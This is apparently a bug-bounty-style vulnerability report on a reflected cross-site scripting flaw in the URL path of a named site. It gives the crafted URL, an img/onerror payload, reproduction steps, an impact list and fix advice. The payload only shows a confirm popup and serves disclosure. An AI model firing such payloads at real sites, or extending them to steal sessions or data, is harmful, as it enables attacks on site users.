## Title

Reflected Cross-Site Scripting (XSS) via Username Injection in URL Path

## Vulnerability Type

Reflected XSS

## Summary

The application reflects user-controlled input from the username segment in the URL path without proper sanitization or output encoding, allowing arbitrary JavaScript execution in the victim’s browser.

The payload was injected directly after the username inside the URL path.

## Vulnerable Endpoint

```http
https://kzlabs.com/59.php/svc/shreddit/api/comments/askreddit/t3_u9po1l"><img%20src=x%20onerror=confirm("Xicorr")>/t1_i5x6zpo
```

## Vulnerable Input

```http
Username URL Path Segment
```

## Steps to Reproduce

1. Open the following URL in a browser:

```http
https://kzlabs.com/59.php/svc/shreddit/api/comments/askreddit/t3_u9po1l"><img%20src=x%20onerror=confirm("Xicorr")>/t1_i5x6zpo
```

2. Observe that a JavaScript popup is triggered automatically on page load.

## Payload Used

```html
"><img src=x onerror=confirm("Xicorr")>
```

## Proof of Concept

The application reflects the injected payload from the URL path directly into the page without proper sanitization.

As a result, arbitrary JavaScript executes automatically when the crafted URL is visited.

### Screenshot — Reflected XSS Triggered via URL Path Injection

<img width="1920" height="1078" alt="image" src="https://github.com/user-attachments/assets/5792f4f1-b3b5-4a59-9dc9-54f313634fe5" />

## Impact

An attacker can exploit this vulnerability to:

- Execute arbitrary JavaScript in the victim’s browser
- Hijack authenticated user sessions
- Perform unauthorized actions on behalf of users
- Exfiltrate sensitive information
- Conduct phishing attacks using trusted application context

## Recommendations for Fix

- Properly sanitize and encode all user-controlled input reflected from URL paths
- Avoid rendering raw user input directly into HTML contexts
- Apply contextual output encoding before rendering data
- Validate URL path parameters against expected formats
- Implement a strict Content Security Policy (CSP)
